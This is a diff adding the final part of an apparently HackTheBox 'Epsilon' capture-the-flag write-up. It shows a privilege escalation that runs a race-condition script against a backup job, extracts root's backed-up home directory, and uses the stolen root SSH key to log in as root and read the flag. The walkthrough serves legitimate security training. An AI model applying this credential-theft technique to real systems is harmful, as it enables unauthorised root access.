@@ -897,3 +897,101 @@ done
 ```
 
 <br />
+
+We run the exploit:
+
+<br />
+
+```bash
+tom@epsilon:/tmp/Privesc$ bash escalation.sh
+
+[+] Waiting for the checksum file creation...
+[+] Deleting the checksum file...
+[+] Replacing checksum file by a malicious one...
+[+] Exploited successfully!
+```
+
+<br />
+
+And if we check the `/var/backups/web_backups` directory, we can confirm that the last backup created is bigger than the others.
+
+```bash
+tom@epsilon:/var/backups/web_backups$ ls -l
+total 81392
+-rw-r--r-- 1 root root  1003520 May 25 12:30 596683368.tar
+-rw-r--r-- 1 root root  1003520 May 25 12:31 614471425.tar
+-rw-r--r-- 1 root root  1003520 May 25 12:32 633946377.tar
+-rw-r--r-- 1 root root 80332800 May 25 12:33 649703684.tar
+```
+
+<br />
+
+So we copy it to `/tmp`:
+
+<br />
+
+```bash
+cp 649703684.tar /tmp
+```
+
+<br />
+
+Finally, we extract its contents:
+
+<br />
+
+```bash
+tar -xf 649703684.tar
+tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted 
+tar: Exiting with failure status due to previous errors
+```
+
+<br />
+
+Despite the error, we can still access the extracted content. `Checksum` is the `/root` directory:
+
+<br />
+
+```bash
+tom@epsilon:/tmp$ cd opt/backups/checksum/
+tom@epsilon:/tmp/opt/backups/checksum$ ls -la
+total 60
+drwx------  9 tom tom 4096 May 25 11:35 .
+drwxrwxr-x  3 tom tom 4096 May 25 12:37 ..
+drwxr-xr-x  2 tom tom 4096 Dec 20  2021 .aws
+-rw-r--r--  1 tom tom 3106 Dec  5  2019 .bashrc
+drwx------  4 tom tom 4096 Dec 20  2021 .cache
+drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .config
+-rw-r--r--  1 tom tom   33 Nov 17  2021 .gitconfig
+drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .local
+drwxr-xr-x 36 tom tom 4096 May 25 11:35 .localstack
+-rw-r--r--  1 tom tom  161 Dec  5  2019 .profile
+drwx------  2 tom tom 4096 Dec 20  2021 .ssh
+-rw-r--r--  1 tom tom  356 Nov 17  2021 docker-compose.yml
+-rwxr-xr-x  1 tom tom  453 Nov 17  2021 lambda.sh
+-rw-r-----  1 tom tom   33 May 25 11:35 root.txt
+drwxr-xr-x  2 tom tom 4096 Dec 20  2021 src
+```
+
+<br />
+
+Now, we can get the root `id_rsa` and connect to localhost as superuser:
+
+<br />
+
+```bash
+tom@epsilon:/tmp/opt/backups/checksum/.ssh$ ssh -i id_rsa root@localhost
+...[snip]...
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
+...[snip]...
+root@epsilon:~# cat root.txt
+8dc5fcd7c973ef75d6341885a8xxxxxx
+```
+
+<br />
+
+Machine pwned! I hope you learned a lot and understood all the concepts.
+
+Keep hacking! ❤️❤️
+
+<br />
